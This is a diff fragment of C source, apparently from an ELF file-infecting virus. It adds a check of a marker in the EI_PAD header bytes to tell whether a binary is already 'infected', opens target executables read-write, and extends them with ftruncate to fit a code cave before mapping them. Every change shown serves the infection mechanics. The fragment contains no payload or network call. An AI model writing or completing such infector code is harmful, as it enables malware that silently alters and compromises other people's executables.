@@ -13,6 +13,7 @@
 
 int	check_elf_magic(int fd) {
 	Elf64_Ehdr ehdr;
+	uint32_t magic;
 
 	if (_syscall(SYS_pread64, fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
 		ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
@@ -24,6 +25,12 @@ int	check_elf_magic(int fd) {
 
 	/* check if it's a 64-bit elf */
 	if (ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
+		return -1;
+	}
+
+	/* check EI_PAD to see if its infected */
+	magic = *(uint32_t *)&ehdr.e_ident[EI_PAD];
+	if (magic == MAGIC_NUMBER) {
 		return -1;
 	}
 
@@ -59,9 +66,9 @@ int map_file(const char *filename, t_data *data) {
 	int		fd;
 	uint8_t	*file;
 	struct stat st;
-	char	buf[4096];
 
-	fd = _syscall(SYS_open, filename, O_RDONLY);
+	/* read + write */
+	fd = _syscall(SYS_open, filename, O_RDWR);
 	if (fd == -1) {
 		return -1;
 	}
@@ -84,28 +91,15 @@ int map_file(const char *filename, t_data *data) {
 
 	const size_t size = st.st_size + data->cave.p_size + bss_len;
 
-	file = (uint8_t *)_syscall(SYS_mmap, NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if (file == MAP_FAILED) {
+	if (_syscall(SYS_ftruncate, fd, size) == -1) {
 		_syscall(SYS_close, fd);
 		return -1;
 	}
 
-	/* remove it ? */
-	ft_memset(file, 0, size);
-
-	uint8_t *ptr = file;
-
-	while (1) {
-		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
-		if (ret == -1) {
-			_syscall(SYS_close, fd);
-			_syscall(SYS_munmap, file, size);
-			return -1;
-		}
-		else if (ret == 0)
-			break;
-		ft_memcpy(ptr, buf, ret);
-		ptr += ret;
+	file = (uint8_t *)_syscall(SYS_mmap, NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE, fd, 0);
+	if (file == MAP_FAILED) {
+		_syscall(SYS_close, fd);
+		return -1;
 	}
 
 	_syscall(SYS_close, fd);
